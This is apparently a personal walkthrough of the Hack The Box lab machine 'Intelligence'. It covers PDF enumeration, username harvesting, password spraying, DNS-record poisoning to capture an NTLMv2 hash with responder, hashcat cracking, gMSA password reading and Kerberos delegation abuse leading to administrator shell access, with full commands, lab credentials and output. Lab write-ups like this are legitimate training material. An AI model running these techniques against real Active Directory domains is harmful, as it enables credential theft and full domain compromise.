```
sudo nmap -sS -sC -sV -p- 10.10.10.248
Nmap scan report for 10.10.10.248
Host is up (0.049s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Intelligence
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-16 07:09:55Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2025-09-16T07:11:24+00:00; +6h59m59s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-16T07:11:24+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-16T07:11:24+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2025-09-16T07:11:24+00:00; +7h00m00s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
49723/tcp open  msrpc         Microsoft Windows RPC
49742/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time: 
|   date: 2025-09-16T07:10:45
|_  start_date: N/A
```

DC: `dc.intelligence.htb`
site: `intelligence.htb`

we got bunch of ports poppin but looks to me well start at port 80 and then something with ldap is gonna come of this, also to note there is ssl-ldap on port 3269 of course there is bunch of rpc as well we can try logging in anonymously but first lets check the website, start from the top!
cool looking site:
![[Pasted image 20250915201937.png]]

i find a button that takes me to /documents/`[pdf]` i will run go buster against this see if we can find any interesting documents..
```
gobuster dir -u http://10.10.10.248/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -x pdf

returned only:
/documents            (Status: 301) [Size: 153] [--> http://10.10.10.248/documents/]
/index.html           (Status: 200) [Size: 7432]
```

ok now for /documents:
```
gobuster dir -u http://10.10.10.248/documents/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -x pdf
```
found nothing but favicon...
i notice though as i should have before that:
when we click on the url link that the pdf files look like this:
`2020-01-01-upload.pdf`
aka dates... i dont have a date wordlist handy so i will google for one:
and found: `https://github.com/Septimus4/dateGenerator`
shout out to them!

ill clone it and run:
```
python3  date_generator.py 2019 2022 0 "-" > date_wordlist.txt
```

based off of this in the readme file:
```
python3  date_generator.py {starting year} {ending year} {display format} {separator}
```

now again if you notice from above it has `-upload` appended.. no prob lets write our own quick python script:
append_word.py
```
#!/usr/bin/env python3

import sys

def append_suffix(input_file, output_file, suffix="-upload"):
    with open(input_file, "r") as infile, open(output_file, "w") as outfile:
        for line in infile:
            word = line.strip()
            if word: 
                outfile.write(f"{word}{suffix}\n")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <input_wordlist> <output_wordlist>")
        sys.exit(1)

    input_file = sys.argv[1]
    output_file = sys.argv[2]
    append_suffix(input_file, output_file)
    print(f"[+] Done! Results saved to {output_file}")
```

```
python3 append_word.py date_wordlist.txt date_upload_wordlist.txt
[+] Done! Results saved to date_upload_wordlist.txt
```

now we run gobuster again:
```
gobuster dir -u http://10.10.10.248/documents/ -w date_upload_wordlist.txt -t 50 -x pdf
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.248/documents/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                date_upload_wordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              pdf
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/2020-01-01-upload.pdf (Status: 200) [Size: 26835]
/2020-01-02-upload.pdf (Status: 200) [Size: 27002]
/2020-01-04-upload.pdf (Status: 200) [Size: 27522]
/2020-01-22-upload.pdf (Status: 200) [Size: 28637]
/2020-01-23-upload.pdf (Status: 200) [Size: 11557]
/2020-01-20-upload.pdf (Status: 200) [Size: 11632]
/2020-01-10-upload.pdf (Status: 200) [Size: 26400]
/2020-01-25-upload.pdf (Status: 200) [Size: 26252]
/2020-02-11-upload.pdf (Status: 200) [Size: 25245]
/2020-01-30-upload.pdf (Status: 200) [Size: 26706]
/2020-02-17-upload.pdf (Status: 200) [Size: 11228]
/2020-03-05-upload.pdf (Status: 200) [Size: 26124]
/2020-02-23-upload.pdf (Status: 200) [Size: 27378]
/2020-02-28-upload.pdf (Status: 200) [Size: 11543]
/2020-02-24-upload.pdf (Status: 200) [Size: 27332]
/2020-03-04-upload.pdf (Status: 200) [Size: 26194]
/2020-03-13-upload.pdf (Status: 200) [Size: 24888]
/2020-03-17-upload.pdf (Status: 200) [Size: 27227]
/2020-03-21-upload.pdf (Status: 200) [Size: 11250]
/2020-04-02-upload.pdf (Status: 200) [Size: 11466]
/2020-04-04-upload.pdf (Status: 200) [Size: 27949]
/2020-04-15-upload.pdf (Status: 200) [Size: 26689]
/2020-04-23-upload.pdf (Status: 200) [Size: 24865]
/2020-05-03-upload.pdf (Status: 200) [Size: 26093]
/2020-05-01-upload.pdf (Status: 200) [Size: 28228]
/2020-05-17-upload.pdf (Status: 200) [Size: 26448]
/2020-05-11-upload.pdf (Status: 200) [Size: 27244]
/2020-05-07-upload.pdf (Status: 200) [Size: 26062]
/2020-05-20-upload.pdf (Status: 200) [Size: 27480]
/2020-06-04-upload.pdf (Status: 200) [Size: 26922]
/2020-06-03-upload.pdf (Status: 200) [Size: 11381]
/2020-05-24-upload.pdf (Status: 200) [Size: 11857]
/2020-06-07-upload.pdf (Status: 200) [Size: 27937]
/2020-06-08-upload.pdf (Status: 200) [Size: 11540]
/2020-05-21-upload.pdf (Status: 200) [Size: 26255]
/2020-06-02-upload.pdf (Status: 200) [Size: 27797]
/2020-05-29-upload.pdf (Status: 200) [Size: 11532]
/2020-06-12-upload.pdf (Status: 200) [Size: 11575]
/2020-06-15-upload.pdf (Status: 200) [Size: 27121]
/2020-06-14-upload.pdf (Status: 200) [Size: 26443]
/2020-06-21-upload.pdf (Status: 200) [Size: 26060]
/2020-06-22-upload.pdf (Status: 200) [Size: 26278]
/2020-06-25-upload.pdf (Status: 200) [Size: 10662]
/2020-06-26-upload.pdf (Status: 200) [Size: 27338]
/2020-06-30-upload.pdf (Status: 200) [Size: 25634]
/2020-06-28-upload.pdf (Status: 200) [Size: 26390]
/2020-07-02-upload.pdf (Status: 200) [Size: 27320]
/2020-03-12-upload.pdf (Status: 200) [Size: 27143]
/2020-07-06-upload.pdf (Status: 200) [Size: 24966]
/2020-07-08-upload.pdf (Status: 200) [Size: 11910]
/2020-07-20-upload.pdf (Status: 200) [Size: 12100]
/2020-07-24-upload.pdf (Status: 200) [Size: 26321]
/2020-08-01-upload.pdf (Status: 200) [Size: 27038]
/2020-08-03-upload.pdf (Status: 200) [Size: 25405]
/2020-08-09-upload.pdf (Status: 200) [Size: 11611]
/2020-08-19-upload.pdf (Status: 200) [Size: 26885]
/2020-08-20-upload.pdf (Status: 200) [Size: 10711]
/2020-09-05-upload.pdf (Status: 200) [Size: 26417]
/2020-09-04-upload.pdf (Status: 200) [Size: 26986]
/2020-09-02-upload.pdf (Status: 200) [Size: 27148]
/2020-09-06-upload.pdf (Status: 200) [Size: 25551]
/2020-09-11-upload.pdf (Status: 200) [Size: 12098]
/2020-09-13-upload.pdf (Status: 200) [Size: 26521]
/2020-09-16-upload.pdf (Status: 200) [Size: 26959]
/2020-09-27-upload.pdf (Status: 200) [Size: 26809]
/2020-09-22-upload.pdf (Status: 200) [Size: 25072]
/2020-09-29-upload.pdf (Status: 200) [Size: 24586]
/2020-10-05-upload.pdf (Status: 200) [Size: 11248]
/2020-09-30-upload.pdf (Status: 200) [Size: 26080]
/2020-10-19-upload.pdf (Status: 200) [Size: 27196]
/2020-11-01-upload.pdf (Status: 200) [Size: 26599]
/2020-11-03-upload.pdf (Status: 200) [Size: 25568]
/2020-11-13-upload.pdf (Status: 200) [Size: 11074]
/2020-11-11-upload.pdf (Status: 200) [Size: 26461]
/2020-11-06-upload.pdf (Status: 200) [Size: 25964]
/2020-11-10-upload.pdf (Status: 200) [Size: 25472]
/2020-11-24-upload.pdf (Status: 200) [Size: 11412]
/2020-11-30-upload.pdf (Status: 200) [Size: 27286]
/2020-12-10-upload.pdf (Status: 200) [Size: 26762]
/2020-12-15-upload.pdf (Status: 200) [Size: 27242]
/2020-12-20-upload.pdf (Status: 200) [Size: 11902]
/2020-12-24-upload.pdf (Status: 200) [Size: 26825]
/2020-12-28-upload.pdf (Status: 200) [Size: 11480]
/2020-12-30-upload.pdf (Status: 200) [Size: 25109]
/2021-01-03-upload.pdf (Status: 200) [Size: 27828]
/2021-01-14-upload.pdf (Status: 200) [Size: 11178]
/2021-01-25-upload.pdf (Status: 200) [Size: 27582]
/2021-01-30-upload.pdf (Status: 200) [Size: 25939]
/2021-02-10-upload.pdf (Status: 200) [Size: 26978]
/2021-02-13-upload.pdf (Status: 200) [Size: 27053]
/2021-02-21-upload.pdf (Status: 200) [Size: 26032]
/2021-02-25-upload.pdf (Status: 200) [Size: 26700]
/2021-03-01-upload.pdf (Status: 200) [Size: 11254]
/2021-03-07-upload.pdf (Status: 200) [Size: 10676]
/2021-03-10-upload.pdf (Status: 200) [Size: 25109]
/2021-03-18-upload.pdf (Status: 200) [Size: 27992]
/2021-03-21-upload.pdf (Status: 200) [Size: 26810]
/2021-03-25-upload.pdf (Status: 200) [Size: 27327]
/2021-03-27-upload.pdf (Status: 200) [Size: 12127]
```
that is more like it! though holy smokes is that a lot of pdf files....

ill first download one and check:
```
exiftool *.pdf

ExifTool Version Number         : 13.10
File Name                       : 2020-12-15-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2025:09:15 20:37:45-04:00
File Access Date/Time           : 2025:09:15 20:37:45-04:00
File Inode Change Date/Time     : 2025:09:15 20:37:45-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams
```
`Jose.Williams`
remember that is prob a profile name pattern in case we need to brute force...

I have no other choice but to freaking go through every single one..
![[Pasted image 20250915204306.png]]

`http://10.10.10.248/documents/2020-06-04-upload.pdf`

could have automated this though using oxdfs py script:
```
#!/usr/bin/env python3

import datetime
import io
import PyPDF2
import requests


t = datetime.datetime(2020, 1, 1)
end = datetime.datetime(2021, 7, 4)
keywords = ['user', 'password', 'account', 'intelligence', 'htb', 'login', 'service', 'new']
users = set()

while True:
    url = t.strftime("http://intelligence.htb/documents/%Y-%m-%d-upload.pdf")
    resp = requests.get(url)
    if resp.status_code == 200:
        with io.BytesIO(resp.content) as data:
            pdf = PyPDF2.PdfFileReader(data)
            users.add(pdf.getDocumentInfo()['/Creator'])
            for page in range(pdf.getNumPages()):
                text = pdf.getPage(page).extractText()
                if any([k in text.lower() for k in keywords]):
                    print(f'==={url}===\n{text}')
    t = t + datetime.timedelta(days=1)
    if t >= end:
        break

with open('users', 'w') as f:
    f.write('\n'.join(users)) 
```

now that i have this lets check where we need to use creds(site has no login page as far as I can tell)

lets look at ldap first:
```
ldapsearch -x -H ldap://10.10.10.248 -s base -LLL
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=intelligence,DC=htb
ldapServiceName: intelligence.htb:dc$@INTELLIGENCE.HTB
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=intelligence,DC=
 htb
serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configurat
 ion,DC=intelligence,DC=htb
schemaNamingContext: CN=Schema,CN=Configuration,DC=intelligence,DC=htb
namingContexts: DC=intelligence,DC=htb
namingContexts: CN=Configuration,DC=intelligence,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=intelligence,DC=htb
namingContexts: DC=DomainDnsZones,DC=intelligence,DC=htb
namingContexts: DC=ForestDnsZones,DC=intelligence,DC=htb
isSynchronized: TRUE
highestCommittedUSN: 102526
dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN
 =Sites,CN=Configuration,DC=intelligence,DC=htb
dnsHostName: dc.intelligence.htb
defaultNamingContext: DC=intelligence,DC=htb
currentTime: 20250916075502.0Z
configurationNamingContext: CN=Configuration,DC=intelligence,DC=ht
```

lets try enum users:
```
ldapsearch -H ldap://10.10.10.248 -x -D "$U" -w "$P" -b DC=support,DC=htb -LLL \
  '(&(objectCategory=person)(objectClass=user))' sAMAccountName \
| awk '/^sAMAccountName:/{print $2}' | sort -u

Operations error (1)
Additional information: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
```

lets go back and get all the creators with this script:
```
!/usr/bin/env python3

import datetime
import io
import requests
import PyPDF2

t = datetime.datetime(2020, 1, 1)
end = datetime.datetime(2021, 7, 4)
keywords = ['user', 'password', 'account', 'intelligence', 'htb', 'login', 'service', 'new']
users = set()

while True:
    url = t.strftime("http://intelligence.htb/documents/%Y-%m-%d-upload.pdf")
    resp = requests.get(url)
    if resp.status_code == 200:
        with io.BytesIO(resp.content) as data:
            reader = PyPDF2.PdfReader(data)

            # Extract metadata
            if reader.metadata:
                creator = reader.metadata.get('/Author') or reader.metadata.get('/Creator')
                if creator:
                    users.add(creator)

            # Search for keywords in text
            for page in reader.pages:
                text = page.extract_text() or ""
                if any(k in text.lower() for k in keywords):
                    print(f"==={url}===\n{text}")

    t = t + datetime.timedelta(days=1)
    if t >= end:
        break

with open("users.txt", "w") as f:
    f.write("\n".join(users))
```

or can use oxdfs i put earlier as well...

now that we have users.txt:
```
Brian.Baker
Tiffany.Molina
William.Lee
Danny.Matthews
David.Reed
Ian.Duncan
Kelly.Long
Travis.Evans
Nicole.Brock
Teresa.Williamson
John.Coleman
Jessica.Moody
Anita.Roberts
David.Wilson
Daniel.Shelton
Stephanie.Young
Thomas.Valenzuela
Brian.Morris
Samuel.Richardson
David.Mcbride
Veronica.Patel
Darryl.Harris
Richard.Williams
Scott.Scott
Jason.Patterson
Thomas.Hall
Kaitlyn.Zimmerman
Jose.Williams
Jason.Wright
Jennifer.Thomas
```

lets use crackmapexec on ldap or smb to see if that default pass works on any of these accounts:
```
crackmapexec smb 10.10.10.248 -u users.txt -p 'NewIntelligenceCorpUser9876'
```
```
SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
```
`Tiffany.Molina:NewIntelligenceCorpUser9876`

now that we got that data lets really get into ldap:
```
ldapwhoami -H ldap://10.10.10.248 \
  -D 'intelligence.htb\\Tiffany.Molina' -w 'NewIntelligenceCorpUser9876' -x -o nettimeout=5
```
```
ldap_bind: Invalid credentials (49)
	additional info: 80090308: LdapErr: DSID-0C090439, comment: AcceptSecurityContext error, data 52e, v4563
```
welp doesnt look like ldap is working... lets go back to smb:
```
smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -H 10.10.10.248
```
```
IP: 10.10.10.248:445	Name: intelligence.htb    	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	IT                                                	READ ONLY	
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	

```

lets look at that IT...
```
smbclient -U Tiffany.Molina //10.10.10.248/IT NewIntelligenceCorpUser9876
```
`downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021`

is only thing in there... ill grab it and check it out and then keep enum:
```
cat downdetector.ps1                                                       
��# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

looks like a cron job script of some sort but for it to run every 5 min could deem useful for us...

```
smbclient -U Tiffany.Molina //10.10.10.248/Users NewIntelligenceCorpUser9876
```
```
Administrator                       D        0  Sun Apr 18 20:18:39 2021
  All Users                       DHSrn        0  Sat Sep 15 03:21:46 2018
  Default                           DHR        0  Sun Apr 18 22:17:40 2021
  Default User                    DHSrn        0  Sat Sep 15 03:21:46 2018
  desktop.ini                       AHS      174  Sat Sep 15 03:11:27 2018
  Public                             DR        0  Sun Apr 18 20:18:39 2021
  Ted.Graves                          D        0  Sun Apr 18 21:20:26 2021
  Tiffany.Molina                      D        0  Sun Apr 18 20:51:46 2021
```

and what do you know inside of Tiffany.Molina/Desktop there is user.txt which I can grab:
```
mget user.txt
```
```
cat user.txt
a8dfa9a752c3f*************
```
USER PWN!

---

### Priv Esc

Lets go back to that ps1 script we see that teds creds are sent so lets set up our own A record pointing back to our machine:
```
python3 dnstool.py \
  -u INTELLIGENCE\\Tiffany.Molina \
  -p 'NewIntelligenceCorpUser9876' \
  --zone intelligence.htb \
  -dns-ip 10.10.10.248 \
  -a add \
  -r web-walter \
  -d 10.10.14.4 \
  -t A \
  10.10.10.248
```
```
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

cool now start listening:
```
sudo responder -I tun0
```

wait 5 min...
```
[+] Listening for events...

[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:9d98c4ccb0cdcefd:DD753D6F5339A9A84FEDA23728DAE4F9:010100000000000063924B90ED26DC015A9AAAEF04920235000000000200080037004D003800320001001E00570049004E002D0041005A00550051004E005200330056005500460049000400140037004D00380032002E004C004F00430041004C0003003400570049004E002D0041005A00550051004E005200330056005500460049002E0037004D00380032002E004C004F00430041004C000500140037004D00380032002E004C004F00430041004C00080030003000000000000000000000000020000015086A9EDB9D3FC6DDD342426173D7AF3690D8E71AA838BB348BFF190A2A35060A001000000000000000000000000000000000000900400048005400540050002F007700650062002D00770061006C007400650072002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

ill store hash in tedntlm:

`hashcat -m 5600 tedntlm /usr/share/wordlists/rockyou.txt`
-5600 is ntlmv2

`intelligence\Ted.Graves:Mr.Teddy`

```
smbmap -u Ted.Graves -p Mr.Teddy -H 10.10.10.248
```

same access as tif...

lets use python-bloodhound see if we can find some useful permissions:
Ted.Graves is in the ITSupport group, which has `ReadGMSAPassword` on SVC_INT.
```
bloodhound-python -c All -u Ted.Graves -p 'Mr.Teddy' -ns 10.10.10.248 -d intelligence.htb -dc dc.intelligence.htb --zip
```

cool now we can:
```
xc ldap 10.10.10.248 -d intelligence.htb -u Ted.Graves -p 'Mr.Teddy' --gmsa
SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.10.248    636    DC               [+] intelligence.htb\Ted.Graves:Mr.Teddy 
LDAPS       10.10.10.248    636    DC               [*] Getting GMSA Passwords
LDAPS       10.10.10.248    636    DC               Account: svc_int$             NTLM: 1dcabcce2cf522bae77d7dc622587879
```
--gmsa is for the groups since we have permission via ted.
```
impacket-getTGT 'intelligence.htb/svc_int$' \
  -hashes :1dcabcce2cf522bae77d7dc622587879 \
  -dc-ip 10.10.10.248
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

```
sudo ntpdate 10.10.10.248                    
2025-09-16 06:01:11.355929 (-0400) +25200.133410 +/- 0.017613 10.10.10.248 s1 no-leap
CLOCK: time stepped by 25200.133410
```

try a couple times syncing clock didnt work first time...

```
impacket-getTGT 'intelligence.htb/svc_int$' \
  -hashes :1dcabcce2cf522bae77d7dc622587879 \
  -dc-ip 10.10.10.248
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_int$.ccache
```

from bloodhound we know we can run this and it will work:
```
impacket-getST -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :1dcabcce2cf522bae77d7dc622587879 -impersonate administrator intelligence.htb/svc_int
```
```
*] Impersonating administrator
/usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self
/usr/share/doc/python3-impacket/examples/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/share/doc/python3-impacket/examples/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

now we can use this:
```
impacket-wmiexec -k -no-pass administrator@dc.intelligence.htb \
  -dc-ip 10.10.10.248 -target-ip 10.10.10.248
```

PS please make sure to run this on kali:
```
sudo service virtualbox-guest-utils stop
```

if not things get all screwed up...

```
C:\Users\Administrator\Desktop>type root.txt
c41434f6dce88a1************
```

ROOT PWNED!

